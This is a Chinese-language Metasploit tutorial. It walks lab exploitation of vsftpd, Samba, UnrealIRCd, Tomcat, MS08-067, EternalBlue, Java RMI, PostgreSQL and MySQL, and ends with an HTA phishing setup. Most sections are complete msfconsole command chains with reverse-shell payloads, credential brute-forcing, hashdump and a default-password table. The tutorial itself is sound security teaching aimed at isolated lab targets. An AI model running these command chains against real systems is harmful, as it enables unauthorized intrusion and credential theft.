

> Metasploit Framework (MSF) 经典实践项目大全
> 本笔记涵盖从入门到高级的所有经典渗透测试实践项目
> 基于 Metasploit 6.x 版本，运行环境为 Kali Linux
> 更新日期：2025年12月

---

## 目录

1. [环境准备与基础配置](#1-环境准备与基础配置)
2. [入门级实践项目](#2-入门级实践项目)
3. [初级实践项目](#3-初级实践项目)
4. [中级实践项目](#4-中级实践项目)
5. [高级实践项目](#5-高级实践项目)
6. [专家级实践项目](#6-专家级实践项目)
7. [红队实战项目](#7-红队实战项目)
8. [自动化与脚本开发](#8-自动化与脚本开发)
9. [常见错误与解决方案](#9-常见错误与解决方案)
10. [最佳实践与安全建议](#10-最佳实践与安全建议)

---

## 1. 环境准备与基础配置

### 1.1 实验环境搭建

在开始任何渗透测试实践之前，搭建一个安全、合法的实验环境是至关重要的。我们绝对不能在未经授权的系统上进行测试，这不仅违法，还可能造成严重后果。

#### 1.1.1 推荐的靶机环境

以下是一些常用的合法靶机环境，它们专门设计用于安全学习和测试：

| 靶机名称 | 难度 | 说明 | 下载地址 |
|----------|------|------|----------|
| Metasploitable 2 | 入门 | 专为 MSF 设计的 Linux 靶机 | SourceForge |
| Metasploitable 3 | 中级 | Windows/Linux 双版本 | GitHub |
| DVWA | 入门 | Web 漏洞练习平台 | GitHub |
| VulnHub 系列 | 各级 | 大量 CTF 风格靶机 | vulnhub.com |
| HackTheBox | 各级 | 在线渗透测试平台 | hackthebox.com |
| TryHackMe | 各级 | 引导式学习平台 | tryhackme.com |


#### 1.1.2 虚拟化环境配置

```bash
# 推荐使用 VMware 或 VirtualBox 搭建隔离网络
# 网络配置示例（VMware）：
# - Kali Linux (攻击机): 192.168.1.50
# - Metasploitable 2 (靶机): 192.168.1.100
# - Windows 7 (靶机): 192.168.1.101

# 确保虚拟机网络设置为 NAT 或 Host-Only
# 这样可以隔离实验环境，避免影响真实网络
```

```
┌─────────────────────────────────────────────────────────────────┐
│                    实验网络拓扑图                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌──────────────┐         ┌──────────────┐                    │
│   │  Kali Linux  │         │ Metasploitable│                   │
│   │  攻击机      │◄───────►│   靶机        │                   │
│   │ 192.168.1.50 │         │ 192.168.1.100 │                   │
│   └──────────────┘         └──────────────┘                    │
│          │                        │                             │
│          │    ┌──────────────┐    │                             │
│          └───►│  虚拟交换机  │◄───┘                             │
│               │  (Host-Only) │                                  │
│               └──────────────┘                                  │
│                      │                                          │
│               ┌──────────────┐                                  │
│               │  Windows 7   │                                  │
│               │   靶机       │                                  │
│               │ 192.168.1.101│                                  │
│               └──────────────┘                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Metasploit 初始化配置

在开始实践之前，我们需要确保 Metasploit 正确配置并连接到数据库。数据库对于存储扫描结果、管理会话和组织项目非常重要。

```bash
# 1. 启动 PostgreSQL 数据库服务
sudo systemctl start postgresql
sudo systemctl enable postgresql  # 设置开机自启

# 2. 初始化 Metasploit 数据库
sudo msfdb init

# 输出示例：
# [+] Starting database
# [+] Creating database user 'msf'
# [+] Creating databases 'msf'
# [+] Creating databases 'msf_test'
# [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
# [+] Creating initial database schema

# 3. 检查数据库状态
sudo msfdb status

# 4. 启动 msfconsole
msfconsole

# 5. 在 msfconsole 中验证数据库连接
msf6 > db_status
# [*] Connected to msf. Connection type: postgresql.
```

### 1.3 工作区管理

工作区是 Metasploit 中组织不同渗透测试项目的方式。每个工作区都有独立的主机、服务、漏洞和凭证数据。

```bash
# 查看当前工作区
msf6 > workspace
# * default

# 创建新工作区
msf6 > workspace -a lab_practice
# [*] Added workspace: lab_practice
# [*] Workspace: lab_practice

# 切换工作区
msf6 > workspace default
msf6 > workspace lab_practice

# 删除工作区
msf6 > workspace -d old_project

# 重命名工作区
msf6 > workspace -r old_name new_name

# 列出所有工作区及其统计信息
msf6 > workspace -v
```

---

## 2. 入门级实践项目

这一部分包含最基础的实践项目，适合刚开始学习 Metasploit 的新手。这些项目帮助你熟悉基本操作流程和核心概念。

### 2.1 项目一：基础端口扫描与服务识别

**目标**：学习使用 Metasploit 进行网络侦察，识别目标主机开放的端口和运行的服务。

**难度**：★☆☆☆☆

**前置知识**：基本的网络知识，了解 TCP/IP 协议

#### 2.1.1 项目背景

端口扫描是渗透测试的第一步。通过扫描，我们可以了解目标系统开放了哪些端口，运行着什么服务。这些信息对于后续的漏洞利用至关重要。

#### 2.1.2 实践步骤

```bash
# 步骤 1：启动 msfconsole 并确认数据库连接
msfconsole -q
msf6 > db_status

# 步骤 2：创建专用工作区
msf6 > workspace -a port_scan_lab
```

```bash
# 步骤 3：使用 db_nmap 进行扫描（推荐方式，结果自动存入数据库）
msf6 > db_nmap -sS -sV -O 192.168.1.100

# 参数说明：
# -sS: SYN 扫描（半开放扫描，速度快且隐蔽）
# -sV: 服务版本检测
# -O:  操作系统检测

# 步骤 4：查看扫描结果
msf6 > hosts           # 查看发现的主机
msf6 > services        # 查看发现的服务
msf6 > services -p 22,80,445  # 按端口过滤

# 步骤 5：使用 Metasploit 内置扫描模块
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1000
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 50
msf6 auxiliary(scanner/portscan/tcp) > run
```

#### 2.1.3 预期输出

```
[*] 192.168.1.100:21 - TCP OPEN
[*] 192.168.1.100:22 - TCP OPEN
[*] 192.168.1.100:23 - TCP OPEN
[*] 192.168.1.100:25 - TCP OPEN
[*] 192.168.1.100:80 - TCP OPEN
[*] 192.168.1.100:139 - TCP OPEN
[*] 192.168.1.100:445 - TCP OPEN
[*] 192.168.1.100:3306 - TCP OPEN
```

#### 2.1.4 常见错误与解决

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `RHOSTS is not set` | 未设置目标主机 | `set RHOSTS <IP>` |
| `Connection refused` | 目标主机未开机或防火墙阻止 | 检查网络连通性 |
| `Database not connected` | 数据库未启动 | `sudo msfdb start` |
| `Permission denied` | SYN 扫描需要 root 权限 | 使用 `sudo msfconsole` |

### 2.2 项目二：SMB 服务枚举

**目标**：学习枚举 Windows SMB 服务，获取用户、共享等信息。

**难度**：★☆☆☆☆

**前置知识**：了解 SMB 协议基础

#### 2.2.1 项目背景

SMB（Server Message Block）是 Windows 系统中用于文件共享的协议。通过枚举 SMB 服务，我们可以获取大量有价值的信息，如用户名、共享文件夹、系统版本等。

#### 2.2.2 实践步骤

```bash
# 步骤 1：SMB 版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_version) > run

# 预期输出：
# [*] 192.168.1.100:445 - SMB Detected (versions:1) (preferred dialect:) 
#     (signatures:optional) (uptime:1h 23m 45s) (guid:{...})
#     (authentication domain:WORKGROUP) Windows 5.1 (language:English)

# 步骤 2：枚举 SMB 共享
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumshares) > run

# 步骤 3：枚举 SMB 用户
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_enumusers) > run

# 步骤 4：枚举 SMB 登录策略
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser administrator
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/smb/smb_login) > run
```

#### 2.2.3 常见错误与解决

```bash
# 错误：STATUS_ACCESS_DENIED
# 原因：没有足够权限访问 SMB 服务
# 解决：尝试使用有效凭证或匿名访问

# 错误：Connection reset by peer
# 原因：SMB 服务未启动或被防火墙阻止
# 解决：确认目标 445 端口开放

# 错误：Login Failed
# 原因：凭证错误
# 解决：检查用户名密码，或尝试其他凭证
```

### 2.3 项目三：FTP 匿名登录检测与利用

**目标**：检测并利用 FTP 服务的匿名登录漏洞。

**难度**：★☆☆☆☆

**前置知识**：了解 FTP 协议基础

#### 2.3.1 项目背景

FTP（文件传输协议）服务如果配置不当，可能允许匿名用户登录。这是一个常见的安全配置错误，攻击者可以利用它获取敏感文件或上传恶意文件。

#### 2.3.2 实践步骤

```bash
# 步骤 1：扫描 FTP 版本
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/ftp_version) > run

# 步骤 2：检测匿名登录
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/anonymous) > run

# 预期输出（如果允许匿名登录）：
# [+] 192.168.1.100:21 - 192.168.1.100:21 - Anonymous READ (220 (vsFTPd 2.3.4))

# 步骤 3：手动连接验证
# 在终端中：
ftp 192.168.1.100
# 用户名：anonymous
# 密码：（直接回车或输入任意邮箱）
```

---

## 3. 初级实践项目

这一部分的项目开始涉及实际的漏洞利用，但都是相对简单和经典的漏洞。

### 3.1 项目四：vsftpd 2.3.4 后门利用

**目标**：利用 vsftpd 2.3.4 版本中的后门漏洞获取 root shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2

#### 3.1.1 漏洞背景

2011年，vsftpd 2.3.4 的源代码被植入了一个后门。当用户名以 `:)` 结尾时，会在 6200 端口打开一个 root shell。这是一个经典的供应链攻击案例。

#### 3.1.2 实践步骤

```bash
# 步骤 1：确认目标运行 vsftpd 2.3.4
msf6 > use auxiliary/scanner/ftp/ftp_version
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/ftp/ftp_version) > run

# 预期输出：
# [+] 192.168.1.100:21 - FTP Banner: '220 (vsFTPd 2.3.4)'

# 步骤 2：搜索并使用漏洞利用模块
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 步骤 3：查看模块信息
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

# 步骤 4：配置参数
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100

# 步骤 5：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] 192.168.1.100:21 - Banner: 220 (vsFTPd 2.3.4)
# [*] 192.168.1.100:21 - USER: 331 Please specify the password.
# [+] 192.168.1.100:21 - Backdoor service has been spawned, handling...
# [+] 192.168.1.100:21 - UID: uid=0(root) gid=0(root)
# [*] Found shell.
# [*] Command shell session 1 opened

# 步骤 6：验证权限
id
# uid=0(root) gid=0(root)
whoami
# root
```

#### 3.1.3 漏洞原理图解

```
┌─────────────────────────────────────────────────────────────────┐
│                vsftpd 2.3.4 后门触发流程                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   攻击者                          vsftpd 服务器                 │
│     │                                  │                        │
│     │  1. 连接 FTP (端口 21)           │                        │
│     │─────────────────────────────────►│                        │
│     │                                  │                        │
│     │  2. 发送用户名 "user:)"          │                        │
│     │─────────────────────────────────►│                        │
│     │                                  │                        │
│     │                    3. 后门触发，开放 6200 端口            │
│     │                                  │                        │
│     │  4. 连接后门端口 6200            │                        │
│     │─────────────────────────────────►│                        │
│     │                                  │                        │
│     │  5. 获得 root shell              │                        │
│     │◄─────────────────────────────────│                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 3.1.4 常见错误与解决

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Exploit completed, but no session was created` | 后门端口被防火墙阻止 | 检查 6200 端口是否可达 |
| `Connection refused` | FTP 服务未运行 | 确认目标 21 端口开放 |
| `Banner: 220 (vsFTPd 3.x.x)` | 版本不受影响 | 此漏洞仅影响 2.3.4 版本 |

### 3.2 项目五：Samba usermap_script 漏洞利用

**目标**：利用 Samba 的命令注入漏洞获取 shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2

**CVE编号**：CVE-2007-2447

#### 3.2.1 漏洞背景

Samba 3.0.20 到 3.0.25rc3 版本中存在一个命令注入漏洞。当使用非默认的 "username map script" 配置时，攻击者可以通过在用户名中注入 shell 元字符来执行任意命令。

#### 3.2.2 实践步骤

```bash
# 步骤 1：确认 Samba 版本
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_version) > run

# 步骤 2：搜索漏洞模块
msf6 > search samba usermap
# 或
msf6 > search CVE-2007-2447

# 步骤 3：使用漏洞利用模块
msf6 > use exploit/multi/samba/usermap_script

# 步骤 4：查看并配置参数
msf6 exploit(multi/samba/usermap_script) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse

# 步骤 5：设置监听参数
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 6：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] Started reverse TCP double handler on 192.168.1.50:4444
# [*] Accepted the first client connection...
# [*] Accepted the second client connection...
# [*] Command: echo xxxxxxxx;
# [*] Writing to socket A
# [*] Writing to socket B
# [*] Reading from sockets...
# [*] Reading from socket A
# [*] A]A is input...
# [*] Command shell session 1 opened

# 步骤 7：验证
id
whoami
```

### 3.3 项目六：UnrealIRCd 后门利用

**目标**：利用 UnrealIRCd 3.2.8.1 中的后门获取 shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2

#### 3.3.1 漏洞背景

2009-2010年间，UnrealIRCd 3.2.8.1 的官方下载包被植入后门。攻击者可以通过发送特定字符串 "AB;" 后跟系统命令来执行任意代码。

#### 3.3.2 实践步骤

```bash
# 步骤 1：扫描 IRC 服务
msf6 > db_nmap -sV -p 6667 192.168.1.100

# 步骤 2：搜索并使用漏洞模块
msf6 > search unrealircd
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor

# 步骤 3：配置参数
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 4：执行
msf6 exploit(...) > exploit

# 成功后获得 shell
id
# uid=0(root) gid=0(root)
```

### 3.4 项目七：Tomcat 管理器弱口令利用

**目标**：利用 Tomcat 管理器的弱口令上传 WAR 文件获取 shell。

**难度**：★★☆☆☆

**靶机**：Metasploitable 2 或任何配置了弱口令的 Tomcat 服务器

#### 3.4.1 漏洞背景

Apache Tomcat 的管理器应用（Manager App）允许管理员部署 WAR 文件。如果管理器使用弱口令或默认凭证，攻击者可以上传恶意 WAR 文件获取服务器控制权。

#### 3.4.2 实践步骤

```bash
# 步骤 1：扫描 Tomcat 服务
msf6 > db_nmap -sV -p 8080 192.168.1.100

# 步骤 2：暴力破解 Tomcat 管理器凭证
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set RPORT 8080
msf6 auxiliary(...) > set STOP_ON_SUCCESS true
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.100:8080 - Login Successful: tomcat:tomcat

# 步骤 3：使用获取的凭证上传恶意 WAR
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 8080
msf6 exploit(...) > set HttpUsername tomcat
msf6 exploit(...) > set HttpPassword tomcat
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 4：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Retrieving session ID and CSRF token...
# [*] Uploading and deploying xxxxxxxx.war ...
# [*] Executing xxxxxxxx...
# [*] Undeploying xxxxxxxx ...
# [*] Sending stage (58829 bytes) to 192.168.1.100
# [*] Meterpreter session 1 opened

# 步骤 5：在 Meterpreter 中操作
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
```

#### 3.4.3 常见 Tomcat 默认凭证

| 用户名 | 密码 |
|--------|------|
| tomcat | tomcat |
| admin | admin |
| manager | manager |
| role1 | role1 |
| root | root |
| both | tomcat |

---

## 4. 中级实践项目

这一部分的项目涉及更复杂的漏洞利用场景，需要对系统和网络有更深入的理解。

### 4.1 项目八：MS08-067 漏洞利用（经典 Windows 漏洞）

**目标**：利用 MS08-067 漏洞获取 Windows XP/2003 系统的控制权。

**难度**：★★★☆☆

**靶机**：Windows XP SP2/SP3 或 Windows Server 2003

**CVE编号**：CVE-2008-4250

#### 4.1.1 漏洞背景

MS08-067 是 Windows Server 服务中的一个远程代码执行漏洞，影响 Windows 2000、XP、Server 2003 等系统。这个漏洞被 Conficker 蠕虫大规模利用，是历史上最著名的 Windows 漏洞之一。

#### 4.1.2 实践步骤

```bash
# 步骤 1：确认目标系统版本
msf6 > db_nmap -sV -O 192.168.1.101

# 步骤 2：检测漏洞是否存在
msf6 > use auxiliary/scanner/smb/ms08_067_check
msf6 auxiliary(scanner/smb/ms08_067_check) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.101:445 - Host is likely VULNERABLE to MS08-067!

# 步骤 3：使用漏洞利用模块
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(windows/smb/ms08_067_netapi) > show options

# 步骤 4：查看可用目标（非常重要！）
msf6 exploit(...) > show targets

# 输出示例：
#    Id  Name
#    --  ----
#    0   Automatic Targeting
#    1   Windows 2000 Universal
#    ...
#    34  Windows XP SP3 Chinese - Simplified (NX)
#    ...

# 步骤 5：配置参数
msf6 exploit(...) > set RHOSTS 192.168.1.101
msf6 exploit(...) > set TARGET 34  # 根据目标系统选择
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 6：执行漏洞利用
msf6 exploit(...) > exploit

# 成功后进入 Meterpreter
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
```

#### 4.1.3 目标选择的重要性

MS08-067 漏洞利用对目标系统版本非常敏感。选择错误的目标可能导致：
- 漏洞利用失败
- 目标系统蓝屏崩溃
- 服务异常

```bash
# 如何确定正确的目标：
# 1. 使用 Nmap 识别操作系统
msf6 > db_nmap -O 192.168.1.101

# 2. 使用 SMB 版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 3. 如果不确定，可以使用 Automatic Targeting (TARGET 0)
# 但成功率可能较低
```

#### 4.1.4 常见错误与解决

| 错误信息 | 原因 | 解决方案 |
|----------|------|----------|
| `Exploit completed, but no session was created` | 目标选择错误 | 尝试不同的 TARGET 值 |
| `Rex::ConnectionRefused` | SMB 服务未开放 | 确认 445 端口开放 |
| `Target system has been patched` | 系统已打补丁 | 此漏洞无法利用 |
| `BSOD (蓝屏)` | 目标选择错误或系统不稳定 | 重启靶机，选择正确目标 |

### 4.2 项目九：MS17-010 永恒之蓝漏洞利用

**目标**：利用永恒之蓝漏洞获取 Windows 7/2008/2012 系统控制权。

**难度**：★★★☆☆

**靶机**：未打补丁的 Windows 7/Server 2008 R2/Server 2012

**CVE编号**：CVE-2017-0144

#### 4.2.1 漏洞背景

MS17-010（永恒之蓝）是 2017 年由 Shadow Brokers 泄露的 NSA 网络武器之一。这个漏洞影响 Windows SMBv1 协议，被 WannaCry 和 NotPetya 勒索软件大规模利用，造成了全球性的网络安全事件。

#### 4.2.2 实践步骤

```bash
# 步骤 1：检测目标是否存在漏洞
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.101:445 - Host is likely VULNERABLE to MS17-010!
#     - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)

# 步骤 2：选择漏洞利用模块
msf6 > search ms17-010 type:exploit

# 主要模块：
# exploit/windows/smb/ms17_010_eternalblue     - 原始 EternalBlue
# exploit/windows/smb/ms17_010_psexec          - 使用 PsExec 方式
# exploit/windows/smb/ms17_010_eternalblue_win8 - Windows 8+ 专用

# 步骤 3：使用 EternalBlue 模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 步骤 4：配置参数
msf6 exploit(...) > set RHOSTS 192.168.1.101
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# 步骤 5：执行漏洞利用
msf6 exploit(...) > exploit

# 预期输出：
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] 192.168.1.101:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
# [+] 192.168.1.101:445 - Host is likely VULNERABLE to MS17-010!
# [*] 192.168.1.101:445 - Connecting to target for exploitation.
# [+] 192.168.1.101:445 - Connection established for exploitation.
# [+] 192.168.1.101:445 - Target OS selected valid for OS indicated by SMB reply
# [*] 192.168.1.101:445 - CORE raw buffer dump (42 bytes)
# [*] 192.168.1.101:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
# [*] 192.168.1.101:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
# [*] 192.168.1.101:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
# [+] 192.168.1.101:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
# [*] 192.168.1.101:445 - Sending egg to corrupted connection.
# [*] 192.168.1.101:445 - Triggering free of corrupted buffer.
# [*] Sending stage (200774 bytes) to 192.168.1.101
# [+] 192.168.1.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] 192.168.1.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [+] 192.168.1.101:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
# [*] Meterpreter session 1 opened

# 步骤 6：后渗透操作
meterpreter > sysinfo
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
```

#### 4.2.3 漏洞利用流程图

```
┌─────────────────────────────────────────────────────────────────┐
│                  MS17-010 漏洞利用流程                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. SMB 协议握手                                               │
│      攻击者 ──────────────────────────────────► 目标            │
│                                                                 │
│   2. 发送恶意 SMB 数据包（触发缓冲区溢出）                      │
│      攻击者 ──────────────────────────────────► 目标            │
│                                                                 │
│   3. 内核内存被覆盖，执行 Shellcode                             │
│                                                                 │
│   4. Shellcode 建立反向连接                                     │
│      攻击者 ◄────────────────────────────────── 目标            │
│                                                                 │
│   5. 获得 SYSTEM 权限的 Meterpreter 会话                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

#### 4.2.4 常见错误与解决

```bash
# 错误 1：Exploit completed, but no session was created
# 可能原因：
# - 目标系统已打补丁
# - 防火墙阻止了反向连接
# - Payload 架构不匹配（32位/64位）

# 解决方案：
# 1. 确认漏洞存在
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(...) > set RHOSTS 192.168.1.101
msf6 auxiliary(...) > run

# 2. 检查 Payload 架构
# 64位系统使用：windows/x64/meterpreter/reverse_tcp
# 32位系统使用：windows/meterpreter/reverse_tcp

# 3. 尝试使用 bind_tcp 而不是 reverse_tcp
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp

# 错误 2：Target is not vulnerable
# 原因：系统已打 MS17-010 补丁
# 解决：此漏洞无法利用，尝试其他攻击向量

# 错误 3：Connection reset by peer
# 原因：SMB 服务崩溃或防火墙阻止
# 解决：等待服务恢复或检查网络连通性
```

### 4.3 项目十：Java RMI 反序列化漏洞利用

**目标**：利用 Java RMI 服务的反序列化漏洞获取 shell。

**难度**：★★★☆☆

**靶机**：运行 Java RMI 服务的系统

#### 4.3.1 漏洞背景

Java RMI（远程方法调用）服务在处理序列化对象时存在安全问题。攻击者可以发送恶意序列化对象，在目标系统上执行任意代码。

#### 4.3.2 实践步骤

```bash
# 步骤 1：扫描 RMI 服务
msf6 > use auxiliary/scanner/misc/java_rmi_server
msf6 auxiliary(scanner/misc/java_rmi_server) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 步骤 2：使用漏洞利用模块
msf6 > use exploit/multi/misc/java_rmi_server
msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD java/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

### 4.4 项目十一：PostgreSQL 漏洞利用

**目标**：利用 PostgreSQL 的配置漏洞获取系统访问权限。

**难度**：★★★☆☆

**靶机**：Metasploitable 2

#### 4.4.1 实践步骤

```bash
# 步骤 1：扫描 PostgreSQL 服务
msf6 > use auxiliary/scanner/postgres/postgres_login
msf6 auxiliary(scanner/postgres/postgres_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 预期输出：
# [+] 192.168.1.100:5432 - Login Successful: postgres:postgres

# 步骤 2：利用 PostgreSQL 执行系统命令
msf6 > use exploit/linux/postgres/postgres_payload
msf6 exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME postgres
msf6 exploit(...) > set PASSWORD postgres
msf6 exploit(...) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

### 4.5 项目十二：MySQL 漏洞利用

**目标**：利用 MySQL 的弱口令和 UDF 提权获取系统权限。

**难度**：★★★☆☆

**靶机**：Metasploitable 2

#### 4.5.1 实践步骤

```bash
# 步骤 1：扫描 MySQL 版本
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# 步骤 2：暴力破解 MySQL 凭证
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set BLANK_PASSWORDS true
msf6 auxiliary(...) > run

# 步骤 3：枚举 MySQL 信息
msf6 > use auxiliary/admin/mysql/mysql_enum
msf6 auxiliary(admin/mysql/mysql_enum) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASSWORD ""
msf6 auxiliary(...) > run

# 步骤 4：利用 MySQL UDF 提权
msf6 > use exploit/multi/mysql/mysql_udf_payload
msf6 exploit(multi/mysql/mysql_udf_payload) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set USERNAME root
msf6 exploit(...) > set PASSWORD ""
msf6 exploit(...) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit
```

---

## 5. 高级实践项目

这一部分的项目涉及更复杂的攻击场景，包括客户端攻击、Web 应用漏洞利用和权限提升。

### 5.1 项目十三：客户端攻击 - 恶意文档生成

**目标**：生成恶意 Office 文档，通过社会工程学获取目标系统控制权。

**难度**：★★★★☆

#### 5.1.1 攻击背景

客户端攻击是指通过诱导用户打开恶意文件或访问恶意链接来获取系统访问权限。这种攻击方式在实际渗透测试中非常常见，因为它可以绑过防火墙等网络安全设备。

#### 5.1.2 生成恶意 HTA 文件

```bash
# 步骤 1：使用 HTA 攻击模块
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set SRVHOST 192.168.1.50
msf6 exploit(...) > set SRVPORT 8080
msf6 exploit(...) > exploit

# 输出：
# [*] Exploit running as background job 0.
# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Using URL: http://192.168.1.50:8080/xxxxx.hta
# [*] Server started.

# 将生成的 URL 发送给目标用户
# 当用户访问并运行 HTA 文件时，将获得 Meterpreter 会话
```
